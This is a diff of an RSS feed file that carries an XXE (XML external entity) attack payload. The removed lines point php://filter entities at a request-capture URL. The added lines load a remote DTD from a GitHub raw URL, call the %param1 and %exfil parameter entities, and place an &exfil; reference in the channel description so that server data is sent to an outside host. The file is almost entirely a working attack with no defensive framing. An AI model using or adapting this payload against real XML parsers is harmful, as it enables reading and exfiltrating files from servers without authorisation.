@@ -1,17 +1,18 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE roottag [ 
- <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=http://putsreq.com/jcVVqYcNb9zESnp2Fqws?test=1">
- <!ENTITY % exfil SYSTEM "php://filter/read=convert.base64-encode/resource=http://putsreq.com/jcVVqYcNb9zESnp2Fqws?so=thisworked">
- %file;
- %exfil;
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "https://raw.githubusercontent.com/pszot/publicscripts/master/external.dtd">
+%sp;
+%param1;
+%exfil;
 ]>
 <rss version="2.0">
 <channel>
   <title>W3Schools Home Page</title>
   <link>http://www.w3schools.com/xml/xml_rss.asp</link>
-  <description>aaaa</description>
+  <description>aaaa &exfil;</description>
   <item>
-    <title>VALID TEXT:</title>
+    <title>VALID TEXT: wew</title>
     <link>http://www.w3schools.com/xml/xml_rss.asp</link>
     <description>New RSS tutorial on W3Schools</description>
   </item>
@@ -20,5 +21,8 @@
     <link>http://www.w3schools.com/xml</link>
     <description>New XML tutorial on W3Schools</description>
   </item>
+</channel>
+<channel>
+
 </channel>
 </rss>
